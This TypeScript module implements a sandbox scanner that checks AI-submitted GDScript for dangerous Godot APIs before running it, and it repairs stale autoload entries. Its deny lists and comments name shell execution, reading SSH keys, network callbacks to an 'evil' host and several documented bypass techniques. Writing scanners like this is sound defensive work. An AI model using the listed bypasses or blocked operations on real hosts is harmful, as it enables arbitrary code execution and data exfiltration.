/**
 * src/core/sandbox-scanner.ts — GDScript 执行前安全防线(沙箱扫描 + autoload 检测/修复)
 *
 * W5 遗留批5(2026-09-20):从 src/gdscript-executor.ts 的 Sandbox scanner 段原样搬出
 * (纯搬家零行为变化;gdscript-executor 保留 re-export 兼容存量消费方,新代码请直连本模块)。
 * 涵盖:危险 API 模式扫描(scanGdscriptSandbox 三阶段)、字面量剥离(stripLiterals)、
 * autoload 名称解析/孤儿 bridge 行修复/注入用法检测(detectAutoloadUsage)。
 *
 * ⚠️ KNOWN LIMITATIONS — This scanner is a safety net against accidental misuse,
 * NOT a security boundary. GDScript is Turing-complete; regex cannot exhaustively
 * block indirect/reflection bypasses. For multi-user / untrusted input use
 * container/VM isolation + GODOT_MCP_ALLOW_UNSAFE=false.
 */

import { existsSync, readFileSync, writeFileSync, renameSync } from 'fs';
import { join } from 'path';
import { tokenize, classifyFirstArgument } from './gdscript-scanner.js';
import { getLogger } from './logger.js';

// ─── Sandbox scanner (C-SEC-02) ──────────────────────────────────────────────
//
// ⚠️  KNOWN LIMITATIONS — This scanner is a safety net against accidental misuse,
//     NOT a security boundary. The following bypass patterns are NOT detected:
//
//     1. Variable indirection:  var cmd = "OS"; cmd += ".execute"
//     2. Expression.eval with computed strings: var e = Expression.new(); e.execute(["OS.execute"])
//     3. call()/callv() with non-literal first arg: obj.call(variable)
//     4. ClassDB.class_call() / ClassDB.class_set_property() via reflection
//
//     For multi-user / untrusted input scenarios, use container/VM isolation
//     and set GODOT_MCP_ALLOW_UNSAFE=false.

const DANGEROUS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  // F-1: create_process 与 execute 功能等价(均可启动任意可执行文件),必须同等拦截
  { pattern: /OS\.(execute|shell_open|kill|set_restart_on_exit|crash|create_process)\b/, label: 'OS system command' },
  // 全仓审查 I-2 (2026-09-12): cmdline 内省是标记窃取链第一环——OS.get_cmdline_args() 取回
  // --script 传入的脚本绝对路径,配合变量首参 FileAccess.open(:59/:66 两条模式均不匹配变量)
  // 读包装后脚本正文即可恢复 rndResult/rndError 随机 marker。与 I-1 不同,这不是公开契约
  // (合法脚本无需自查命令行),拦截不破坏任何既有用法。
  { pattern: /OS\.(get_cmdline_args|cmdline_user_args)\b/, label: 'OS cmdline introspection (marker recovery)' },
  // C-SEC-3: OS["execute"] 等索引访问把句点换成方括号,绕过上面的 OS.execute 正则
  { pattern: /\bOS\s*\[/, label: 'OS singleton indexed access (sandbox bypass)' },
  // C-SEC-4: OS 单例别名赋值绕过 —— var s = OS; s.execute("calc") 避开 /OS\.execute/ 字面量。
  // lookbehind (?<![=!<>]) 排除 == / != / <= / >= 比较操作符的第二 =(review I-1:避免误报 x == OS);
  // 负向预查 (?!\s*\.) 排除合法的 = OS.get_xxx() 方法调用赋值,仅抓裸单例别名。
  { pattern: /(?<![=!<>])=\s*OS\b(?!\s*\.)/, label: 'OS singleton aliasing (sandbox bypass)' },
  { pattern: /DirAccess\.(remove_absolute|remove)\b/, label: 'Directory removal' },
  // C-03: Allow FileAccess.READ, only flag write modes (WRITE / READ_WRITE / READ_WRITE_APPEND)
  // Use [^;]* to match to statement boundary — avoids truncation on ')' in file paths
  { pattern: /FileAccess\.open\s*\([^;]*FileAccess\.(?:WRITE|READ_WRITE|READ_WRITE_APPEND)\b/, label: 'File write access' },
  // 2026-08-07 审查 P2 修复（决策2 升级版）：默认模式拦 FileAccess.open 读非 Godot 协议路径。
  // 原 C-03 注释 "Allow FileAccess.READ" 致默认模式放行读任意路径（~/.ssh/id_rsa 等敏感文件），
  // AI 注入的 GDScript 可读后经 print/_mcp_output 回传。模式对齐 :71 load() 非 res:// 拦截，
  // 但额外放行 user://（Godot 用户数据目录，存档等合法用途）——只拦绝对路径/~ /.. / 非协议字面量。
  // 实测内部脚本（godot_operations.gd:815 uid_path 经 _sanitize_res_path）不受影响。
  // stripLiterals 保留协议前缀（:270-274），骨架层匹配正确。
  { pattern: /FileAccess\.open\s*\(\s*["'](?!res:\/\/|user:\/\/)/, label: 'File read with non-resource path (information disclosure)' },
  { pattern: /Engine\.(set_singleton)\b/, label: 'Engine singleton modification' },
  // C-03: Engine.get_singleton bypasses class-level restrictions (e.g. FileAccess, DirAccess)
  { pattern: /Engine\.get_singleton\b/, label: 'Engine singleton access (sandbox bypass)' },
  // IMPORTANT-2 (review): 索引访问把句点换方括号绕过点访问正则。OS 已有 /\bOS\s*\[/ (:50),
  // 补 Engine/FileAccess/DirAccess/JavaScriptBridge(其危险方法均靠点访问正则拦截,方括号写法同样需堵)。
  { pattern: /\b(Engine|FileAccess|DirAccess|JavaScriptBridge)\s*\[/, label: 'Singleton indexed access (sandbox bypass)' },
  { pattern: /JavaScriptBridge\.eval\b/, label: 'JavaScript eval (web escape)' },
  { pattern: /\bstr2var\b/, label: 'str2var (arbitrary deserialization)' },
  { pattern: /\bbytes2var\b/, label: 'bytes2var (arbitrary deserialization)' },
  // C-RES: 单 " 即可 — stripLiterals 已把三引号开/闭引号归一化为单个(见 :271/:283),
  // 故 load("res://") 与 load("""res://""") 骨架均为 load("res://"),单 " 正则正确放行。
  // 注:曾试 "{1,3}" 但负向预查+可变量词会回溯到单 " 而误报,故改在骨架层归一化。
  { pattern: /load\s*\(\s*"(?!res:\/\/)/, label: 'load() with non-resource path' },
  { pattern: /Thread\.(new|start)\b/, label: 'Thread creation' },
  { pattern: /Semaphore\.new\b/, label: 'Semaphore creation' },
  { pattern: /Mutex\.new\b/, label: 'Mutex creation' },
  // C-SEC-01: Reflection/indirect call bypass vectors
  { pattern: /\bClassDB\b/, label: 'ClassDB reflection (sandbox bypass)' },
  // C-SEC-01: Only flag .call()/.callv() with string-literal first arg (reflection pattern).
  // Legitimate Callable.call(variable) is NOT flagged — internal tools use this (e.g. physics-ops collision_overlay).
  { pattern: /\.call\s*\(\s*["']/, label: 'Indirect call via .call("string") (sandbox bypass)' },
  { pattern: /\.callv\s*\(\s*["']/, label: 'Indirect call via .callv("string") (sandbox bypass)' },
  // A-09: Expression.execute can evaluate arbitrary expressions
  // IMPORTANT-3 (review): .* 不跨行,var e=Expression.new()\ne.execute() 分行即绕过。改 [\s\S]
  // 非贪婪并限长 500 防 ReDoS(典型 Expression.new()+parse+execute 距离 <<500)。
  { pattern: /Expression\b[\s\S]{0,500}?\.execute\b/, label: 'Expression.execute (arbitrary code execution)' },
  // S-1-review: var2str + str2var chain (arbitrary object reconstruction)
  { pattern: /\bvar2str\b/, label: 'var2str (serialization bypass)' },
  // S-1-review: get_script() reflection escape
  { pattern: /\.get_script\b/, label: 'get_script reflection (sandbox bypass)' },
  // S-1-review: ResourceLoader.load with non-resource path
  // A-3 (advisory): 去掉 [^)]* 贪婪(原回溯到闭合 " 后检查,那里是 ')' 而非 res://,
  // 致 ResourceLoader.load("res://a.tres") 误报)。对齐 :68 load 设计,单 ["'] 后即查 res://。
  { pattern: /ResourceLoader\.load\s*\(\s*["'](?!res:\/\/)/, label: 'ResourceLoader.load with non-resource path' },
  // 2026-08-07 审查 P2 修复：网络回连 API 未覆盖。GDScript 可 var ws = WebSocketPeer.new();
  // ws.connect_to_url("ws://evil") 发起网络回连绕过 OS.execute 禁令实现数据外传/C2
  // （Thread.new 已拦无法异步，但同步 connect + 主循环 poll 仍可行）。
  // addon 侧 bridge 用 TCP 不受沙箱约束（沙箱只管 AI 注入脚本）。
  { pattern: /WebSocketPeer\.(new|create)\b/, label: 'WebSocketPeer creation (network callback)' },
  { pattern: /HTTPClient\.new\b/, label: 'HTTPClient creation (network callback)' },
  { pattern: /StreamPeer(TCP|SSL|Object)?\.new\b/, label: 'StreamPeer creation (network callback)' },
  { pattern: /\.(connect_to_url|connect_to_host)\b/, label: 'Network connect (callback bypass)' },
];

/**
 * Phase 2: Dangerous API tokens that should not appear in string concatenation.
 * Detects bypass attempts like "OS" + ".execute" or preload with computed paths.
 */
const DANGEROUS_API_TOKENS: readonly string[] = [
  // F-1: 拦截字符串拼接绕过(OS + ".create_process")
  'OS.execute', 'OS.shell_open', 'OS.kill', 'OS.create_process',
  'DirAccess.remove', 'DirAccess.remove_absolute',
  'JavaScriptBridge.eval',
  'str2var', 'bytes2var', 'var2str',
  // C-SEC-01: Reflection bypass tokens for string concatenation detection
  'ClassDB', '.call(', '.callv(',
  // C-03: Singleton access via string concatenation
  'Engine.get_singleton',
  // S-1-review: Additional reflection/bypass tokens
  '.get_script', 'ResourceLoader.load',
];

/** 转义正则元字符。用于 autoload 名称匹配。 */
export function escapeRegExp(str: string): string {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ─── Autoload auto-detection ─────────────────────────────────────────────────

let _autoloadCache: { projectPath: string; names: string[]; ts: number } | null = null;
const AUTOLOAD_CACHE_TTL = 30_000;

/** @internal 测试用：重置缓存 */
export function _resetAutoloadCache(): void {
  _autoloadCache = null;
}

/**
 * 从 project.godot 解析 autoload 单例名列表。
 * 全面 try-catch：任何错误返回空数组。
 */
export function parseAutoloadNames(projectPath: string): string[] {
  const now = Date.now();
  if (_autoloadCache && _autoloadCache.projectPath === projectPath && now - _autoloadCache.ts < AUTOLOAD_CACHE_TTL) {
    return _autoloadCache.names;
  }
  try {
    const configPath = join(projectPath, 'project.godot');
    if (!existsSync(configPath)) return [];
    const content = readFileSync(configPath, 'utf-8');
    const names: string[] = [];
    let inAutoload = false;
    for (const line of content.split('\n')) {
      const trimmed = line.trim();
      if (trimmed.startsWith('[')) {
        inAutoload = trimmed === '[autoload]';
        continue;
      }
      if (inAutoload) {
        const kvMatch = trimmed.match(/^(\S+)\s*=/);
        if (kvMatch) names.push(kvMatch[1]!);
      }
    }
    _autoloadCache = { projectPath, names, ts: now };
    return names;
  } catch {
    return [];
  }
}

/**
 * P2-4(审查 I-2 修正): orphan 行判定——键形态按写入方常量。新键 MCPBridge=(AUTOLOAD_KEY,
 * bridge-client.ts/game-bridge.ts 写入);旧键 autoload/MCPBridge=(≤0.23.x 误写,
 * AUTOLOAD_KEY_LEGACY)。且行值须指向 res://mcp_bridge.gd 才删——防误删用户自定义
 * 同名 autoload(指向其他脚本)。原版注释把新旧键说反且漏 legacy 形态。
 */
function isOrphanBridgeLine(l: string): boolean {
  const t = l.trimStart();
  const isKey = t.startsWith('MCPBridge=') || t.startsWith('autoload/MCPBridge=');
  return isKey && l.includes('res://mcp_bridge.gd');
}

/**
 * 纯函数:project.godot 内容含 orphan bridge autoload 行时返回移除后的新内容,否则 null。
 * (逻辑/IO 分离:纯字符串可稳定单测。注意键大小写——真实键为 MCPBridge(大写,
 * bridge-client.ts AUTOLOAD_KEY),首版实现与测试双双手误小写 McpBridge,错打正着
 * 掩盖至审查 I-2 修正;键名常量必须 grep 写入方核对,不能信记忆/注释。)
 */
export function removeOrphanBridgeLines(content: string): string | null {
  const lines = content.split('\n');
  if (!lines.some(isOrphanBridgeLine)) return null;
  return lines.filter(l => !isOrphanBridgeLine(l)).join('\n');
}

/**
 * P2-4 (2026-09-11): orphan autoload 修复——project.godot 残留 McpBridge autoload 条目但
 * 脚本本体已删(手删/卸载残留)时,每次 headless 操作都会因 autoload 加载失败而崩
 * (来源 Erodenn bridge-manager.ts repairOrphaned 的前置自愈)。IO 壳:读→纯函数判定→原子写。
 * 返回 true = 本次修复了(调用方 warn 留痕)。幂等:无 orphan 返回 false 零写入。
 * 行为断言走纯函数 removeOrphanBridgeLines(本壳 IO 含 tmpdir 写盘,冒烟级覆盖)。
 */
export function repairOrphanedBridgeAutoload(projectPath: string): boolean {
  try {
    const configPath = join(projectPath, 'project.godot');
    const scriptPath = join(projectPath, 'mcp_bridge.gd');
    if (!existsSync(configPath) || existsSync(scriptPath)) return false;
    const next = removeOrphanBridgeLines(readFileSync(configPath, 'utf-8'));
    if (next === null) return false;
    const tmpPath = configPath + '.mcp-tmp';
    writeFileSync(tmpPath, next, 'utf-8');
    renameSync(tmpPath, configPath);
    return true;
  } catch {
    return false;  // best-effort:修复失败不阻塞执行(错误由后续 spawn 自然暴露)
  }
}

/**
 * 检测代码中是否引用了 autoload 单例。
 * A-2 (advisory): 改用 stripLiterals 骨架扫描(剥注释/字符串),消除原词边界匹配的误触发。
 */
export function detectAutoloadUsage(code: string, autoloadNames: string[]): string[] {
  if (!code || autoloadNames.length === 0) return [];
  const skeleton = stripLiterals(code);
  const matched: string[] = [];
  for (const name of autoloadNames) {
    const pattern = new RegExp(`\\b${escapeRegExp(name)}\\b`);
    if (pattern.test(skeleton)) {
      matched.push(name);
    }
  }
  return matched;
}

/** Check if code uses string concatenation to build dangerous API names.
 *  Catches patterns like: "OS" + ".execute", 'Dir' + 'Access.remove', etc.
 *  Uses sliding window over string literals to reconstruct concatenated tokens. */
function detectStringConcatBypass(code: string): string[] {
  const warnings: string[] = [];
  // Extract all string literal contents (single and double quoted)
  const stringContents: string[] = [];
  const stringLiteralRe = /"([^"\\]*(?:\\.[^"\\]*)*)"|'([^'\\]*(?:\\.[^'\\]*)*)'/g;
  let match: RegExpExecArray | null;
  while ((match = stringLiteralRe.exec(code)) !== null) {
    const content = match[1] ?? match[2];
    if (content) stringContents.push(content);
  }

  // Concatenate adjacent string parts and check against dangerous tokens.
  // For "ClassName.method" tokens, also check ".method" suffix (e.g. ".execute")
  // to catch: "OS" + ".execute" → ".execute" matches suffix.
  // IMPORTANT-1 (review): 窗口原固定 4,无 '.' 的 token(如 str2var)5+ 段可绕过。扩大到 8
  // 覆盖更多分段;9+ 段依赖容器隔离(沙箱非对抗边界,见图灵完备声明)。O(n²):成本随窗口与字符串数增长。
  const MAX_CONCAT_WINDOW = 8;
  for (let i = 0; i < stringContents.length; i++) {
    for (let j = i; j < Math.min(i + MAX_CONCAT_WINDOW, stringContents.length); j++) {
      const combined = stringContents.slice(i, j + 1).join('');
      for (const token of DANGEROUS_API_TOKENS) {
        const dotIdx = token.indexOf('.');
        const suffix = dotIdx >= 0 ? token.slice(dotIdx) : null;
        if (combined === token || (suffix !== null && combined === suffix)) {
          warnings.push(`[SANDBOX-P2] String concatenation bypass attempt: "${token}" built from parts`);
          break;
        }
      }
    }
  }

  // Detect preload with non-literal or computed path
  if (/\bpreload\s*\(\s*(?!["']res:\/\/)/.test(code)) {
    warnings.push('[SANDBOX-P2] preload() with computed/dynamic path');
  }

  // C-01-fix: Detect % format string used to construct API names.
  // Only flag when a string containing a dangerous token suffix is used with % formatting,
  // not innocent uses like "Score: %d" % value.
  for (const token of DANGEROUS_API_TOKENS) {
    const dotIdx = token.indexOf('.');
    const suffix = dotIdx >= 0 ? token.slice(dotIdx) : null;
    // Match: "OS%s" or "DirAccess%s" — dangerous token prefix followed by % format
    // Guard: skip when prefixPart is empty (tokens starting with '.' like '.call(')
    // to avoid false positives matching bare "%s"/"%d"/"%i".
    const prefixPart = dotIdx >= 0 ? token.slice(0, dotIdx) : token;
    if (prefixPart && new RegExp(`["']${escapeRegExp(prefixPart)}%[sdi]["']`).test(code)) {
      warnings.push(`[SANDBOX-P2] % format string used to construct dangerous API: "${token}"`);
    }
    // Match: ".execute" %s or similar suffix construction
    if (suffix && new RegExp(`["']${escapeRegExp(suffix)}["'].*%[sdi]`).test(code)) {
      warnings.push(`[SANDBOX-P2] % format string used to construct API suffix: "${suffix}"`);
    }
  }

  return warnings;
}

/** Best-effort scan for dangerous GDScript patterns. Returns warnings array.
 *  Enabled by default; set GODOT_MCP_SANDBOX=disabled to skip scanning.
 *  When warnings are found, execution is BLOCKED unless GODOT_MCP_DISABLE_SAFETY=true
 *  (or the legacy GODOT_MCP_ALLOW_UNSAFE=true).
 *
 *  Phase 1: Direct regex matching of dangerous API calls.
 *  Phase 2: String concatenation bypass detection + preload computed path detection.
 *
 *  ⚠️  SECURITY LIMITATION: This scanner does NOT parse GDScript syntax.
 *  Phase 2 catches common bypass patterns but determined attackers may still
 *  find ways around it. It is designed to prevent ACCIDENTAL and common-intent
 *  misuse, not to defend against adversarial input. For true sandboxing, use
 *  container/VM isolation.
 *
 *  ⚠️  GODOT_MCP_SANDBOX=disabled / GODOT_MCP_DISABLE_SAFETY=true completely
 *  bypasses ALL safety checks. These flags exist for development/debugging only.
 *  Do NOT use in production or multi-user environments. Any code executed while
 *  these flags are active has unrestricted access to the host filesystem,
 *  network, and process execution via OS.execute / FileAccess / DirAccess. */
/**
 * 剥去 GDScript 代码中的字符串字面量内容与注释，返回"骨架"。
 * 保留引号对、换行和代码结构；仅删除字符串内容与注释文本。
 *
 * 用途：让 Phase 1 正则扫描在骨架上进行，避免注释/字符串里的危险 API 名导致误报。
 *
 * ⚠️ 契约 P2-RAW：此函数的输出【绝不能】喂给 detectStringConcatBypass（Phase 2）。
 *    Phase 2 依赖字符串字面量内容做拼接重构，必须接收原文。见 scanGdscriptSandbox。
 *
 * 算法：字符级状态机，正确处理单/双/三引号字符串、转义引号、# 注释。
 * 用 charAt 而非 code[i]，规避 noUncheckedIndexedAccess 的 string|undefined。
 * 顺序：先识别字符串（字符串内的 # 不当注释），再识别注释。 */
// C-RES: Godot 资源协议前缀。stripLiterals 剥字符串内容时保留该前缀，使
// load("res://...") / preload("res://...") 在骨架上仍被 load() non-resource-path
// 正则的负向预查正确放行。res:// 仅指项目内资源、非危险向量，保留前缀对其他正则无副作用。
// 2026-08-07 审查 P2: 加 user://（Godot 用户数据目录，存档等合法用途，同 res:// 安全级别），
// 让 FileAccess.open("user://...") 在骨架上也被新读拦截规则的负向预查正确放行。
const GODOT_PROTOCOLS = ['res://', 'user://'] as const;
export function stripLiterals(code: string): string {
  let result = '';
  let i = 0;
  const len = code.length;

  while (i < len) {
    const ch = code.charAt(i);

    // 三引号字符串 """ 或 '''
    if ((ch === '"' || ch === "'") && code.charAt(i + 1) === ch && code.charAt(i + 2) === ch) {
      const quote = ch;
      result += quote; // C-RES: 三引号开引号归一化为单个(骨架等价单引号字符串,下游正则统一处理)
      i += 3;
      // C-RES: 保留 Godot 协议前缀（res:// / user://）
      for (const proto of GODOT_PROTOCOLS) {
        if (code.startsWith(proto, i)) {
          result += proto;
          i += proto.length;
          break;
        }
      }
      while (i < len) {
        if (code.charAt(i) === '\\' && i + 1 < len) {
          i += 2; // 转义:跳过下一字符
          continue;
        }
        if (code.charAt(i) === quote && code.charAt(i + 1) === quote && code.charAt(i + 2) === quote) {
          result += quote; // C-RES: 三引号闭引号归一化为单个(与开引号一致)
          i += 3;
          break;
        }
        i++; // 字符串内容:丢弃
      }
      continue;
    }

    // 单/双引号字符串
    if (ch === '"' || ch === "'") {
      const quote = ch;
      result += quote; // 保留开引号
      i++;
      // C-RES: 保留 Godot 协议前缀（res:// / user://）
      for (const proto of GODOT_PROTOCOLS) {
        if (code.startsWith(proto, i)) {
          result += proto;
          i += proto.length;
          break;
        }
      }
      while (i < len) {
        if (code.charAt(i) === '\\' && i + 1 < len) {
          i += 2; // 转义跳过
          continue;
        }
        if (code.charAt(i) === quote) {
          result += quote; // 保留闭引号
          i++;
          break;
        }
        if (code.charAt(i) === '\n') {
          result += '\n'; // 未闭合即换行:保留换行,退出字符串态
          i++;
          break;
        }
        i++; // 字符串内容:丢弃
      }
      continue;
    }

    // 行注释 # 到行尾
    if (ch === '#') {
      while (i < len && code.charAt(i) !== '\n') {
        i++; // 注释内容:丢弃
      }
      continue; // 换行交给外层循环保留
    }

    result += ch; // 普通代码字符:保留
    i++;
  }

  return result;
}

// ─── Extra dangerous patterns (env-injected, C-SEC-02 扩展) ──────────────────

let _extraPatternsCache: { raw: string; patterns: Array<{ pattern: RegExp; label: string }> } | null = null;

/** @internal 测试用:重置 extra patterns 缓存 */
export function _resetExtraDangerousPatternsCache(): void {
  _extraPatternsCache = null;
}

/**
 * 从环境变量 GODOT_MCP_EXTRA_DANGEROUS_PATTERNS 加载用户自定义危险正则。
 * 格式:JSON 数组 [{"pattern": <正则源码>, "label": <人类可读标签>}, ...]
 *
 * memoized:以 raw 字符串为键,相同 env 不重复解析(风格同 _autoloadCache)。
 * 坏正则/坏 JSON 降级:跳过该条或整体忽略,记录 warn,绝不抛异常。 */
export function loadExtraDangerousPatterns(): Array<{ pattern: RegExp; label: string }> {
  const raw = process.env.GODOT_MCP_EXTRA_DANGEROUS_PATTERNS;
  if (!raw) return [];
  if (_extraPatternsCache && _extraPatternsCache.raw === raw) {
    return _extraPatternsCache.patterns;
  }
  const patterns: Array<{ pattern: RegExp; label: string }> = [];
  try {
    const parsed: unknown = JSON.parse(raw);
    if (!Array.isArray(parsed)) {
      getLogger().warn('security', 'GODOT_MCP_EXTRA_DANGEROUS_PATTERNS is not a JSON array, ignoring');
      _extraPatternsCache = { raw, patterns };
      return patterns;
    }
    for (const entry of parsed) {
      if (!entry || typeof entry !== 'object') continue;
      const e = entry as { pattern?: unknown; label?: unknown };
      if (typeof e.pattern !== 'string' || typeof e.label !== 'string') continue;
      try {
        patterns.push({ pattern: new RegExp(e.pattern), label: e.label });
      } catch (regexErr) {
        getLogger().warn('security', `GODOT_MCP_EXTRA_DANGEROUS_PATTERNS: invalid regex skipped: "${e.pattern}" (${regexErr instanceof Error ? regexErr.message : regexErr})`);
      }
    }
  } catch (jsonErr) {
    getLogger().warn('security', `GODOT_MCP_EXTRA_DANGEROUS_PATTERNS: invalid JSON, ignoring (${jsonErr instanceof Error ? jsonErr.message : jsonErr})`);
  }
  _extraPatternsCache = { raw, patterns };
  return patterns;
}

export function scanGdscriptSandbox(code: string, opts?: { skipPhase3?: boolean }): string[] {
  // P0-1 (2026-07-06 RCE 审查): 双开关 — SANDBOX=disabled 需同时设 GODOT_MCP_UNRESTRICTED=true 才生效,
  // 防 CI/Docker/.envrc 误设单 env 关闭整个沙箱。UNRESTRICTED 是项目级“开发者自担风险”总开关。
  if (process.env.GODOT_MCP_SANDBOX === 'disabled') {
    if (process.env.GODOT_MCP_UNRESTRICTED === 'true') {
      getLogger().warn('security', '⚠️ GODOT_MCP_SANDBOX=disabled + UNRESTRICTED=true — ALL sandbox checks bypassed. Any GDScript code will execute with unrestricted host access.');
      return [];
    }
    getLogger().warn('security', 'GODOT_MCP_SANDBOX=disabled ignored — requires GODOT_MCP_UNRESTRICTED=true (P0-1 double-opt-in). Sandbox stays active.');
  }
  const warnings: string[] = [];

  // 骨架:剥去字符串内容与注释,仅用于 Phase 1 正则匹配,避免注释/字符串里的 API 名误报。
  // ⚠️ 契约 P2-RAW:skeleton 绝不能传给 detectStringConcatBypass(Phase 2)!
  const skeleton = stripLiterals(code);

  // Phase 1: Direct pattern matching (on skeleton)
  for (const { pattern, label } of DANGEROUS_PATTERNS) {
    if (pattern.test(skeleton)) {
      warnings.push(`[SANDBOX] Potential dangerous operation detected: ${label}`);
    }
  }

  // 用户自定义额外危险模式 (GODOT_MCP_EXTRA_DANGEROUS_PATTERNS),同样在骨架上检测
  for (const { pattern, label } of loadExtraDangerousPatterns()) {
    if (pattern.test(skeleton)) {
      warnings.push(`[SANDBOX] Potential dangerous operation detected: ${label}`);
    }
  }

  // C-03: In strict mode, also block FileAccess.READ (all file access) — on skeleton
  if (process.env.GODOT_MCP_SANDBOX === 'strict') {
    if (/FileAccess\.open\b/.test(skeleton)) {
      warnings.push('[SANDBOX] Potential dangerous operation detected: File access (strict mode)');
    }
  }

  // Phase 2: String concatenation bypass detection
  // ⚠️ 契约 P2-RAW:detectStringConcatBypass 必须接收【原文 code】,不能是 skeleton。
  //    它自己提取字符串字面量内容做拼接重构;喂骨架会让所有拼接绕过检测失效。
  const concatWarnings = detectStringConcatBypass(code);
  warnings.push(...concatWarnings);

  // Phase 3 (P6 2026-09-11, Erodenn tokenizer 移植): 非字面量 load/preload/ResourceLoader.load。
  // ⚠️ 时序契约(审查 N-4): 本扫描必须发生在 wrapSnippet 注入模板头(内含 load(_sp))**之前**——
  // 扫的是 options.code 原文;若未来把 wrap 提到 scan 前,execute_gdscript 将因模板头的 load(_sp)
  // 全量误拦(P6 B-1 同根源陷阱)。
  // 正则只拦字面量非 res://(load("C:/x"));变量/表达式形式(load(p)/load("res://" + evil))
  // 正则不可见(纯变量零特征,拼接形式 Phase 2 只抓黑名单 token)。
  // classifyFirstArgument 括号深度感知判 nonliteral("res://" + x 不被前导字面量骗过)。
  // 取舍对齐 Erodenn Tier 1(动态资源路径=任意加载面,静态不可判指向);override 走既有
  // double opt-in(UNRESTRICTED + DISABLE_SAFETY/SANDBOX=disabled)。
  if (opts?.skipPhase3 === true) {
    return warnings;  // runtime 通道(executeGdscriptRuntime):模板代码的动态 load 是服务端固定行为
  }
  const tokens = tokenize(code);
  for (let ti = 0; ti < tokens.length; ti++) {
    const tok = tokens[ti]!;
    if (tok.kind !== 'identifier' && tok.kind !== 'memberChain') continue;
    const isBareLoad = tok.kind === 'identifier' && (tok.text === 'load' || tok.text === 'preload');
    const isRLoad = tok.kind === 'memberChain'
      && tok.chain !== undefined && tok.chain.length === 2
      && tok.chain[0] === 'ResourceLoader' && tok.chain[1] === 'load';
    if (!isBareLoad && !isRLoad) continue;
    // 找紧随的调用括号(容忍换行)
    let tj = ti + 1;
    while (tj < tokens.length && tokens[tj]!.kind === 'newline') tj++;
    if (tj >= tokens.length || tokens[tj]!.kind !== 'punct' || tokens[tj]!.text !== '(') continue;
    if (classifyFirstArgument(tokens, tj) === 'nonliteral') {
      const name = isBareLoad ? tok.text : 'ResourceLoader.load';
      warnings.push(`[SANDBOX] Potential dangerous operation detected: ${name}() with non-literal path (dynamic resource load, tokenizer deep analysis)`);
    }
  }

  return warnings;
}
